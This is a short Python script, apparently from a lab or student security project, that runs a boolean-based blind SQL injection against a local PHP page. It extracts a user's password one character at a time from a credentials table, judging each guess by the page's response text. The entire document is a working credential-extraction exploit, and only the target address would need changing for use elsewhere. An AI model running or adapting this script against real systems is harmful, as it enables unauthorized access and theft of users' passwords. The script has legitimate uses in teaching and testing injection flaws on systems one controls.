import requests
import string

# Place here your values
url        = 'http://127.0.0.1/progettoSWM/SQLi/SQLi3.php'

# Accumulator 
out = ''

for i in range(0, 50):
    for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + '_' + '{' + '}':
        print(c)
        injection = f"1' AND BINARY((SELECT SUBSTRING(Password,{i},1) FROM SQLi2_Credential WHERE Username='BigBadGuy')) = BINARY('{c}') -- "

        response = requests.get(url, params= {"ID": injection})
        if 'We got you covered' in response.text:
            out += c
            print(out)
            break

print(f'Final out data: {out}')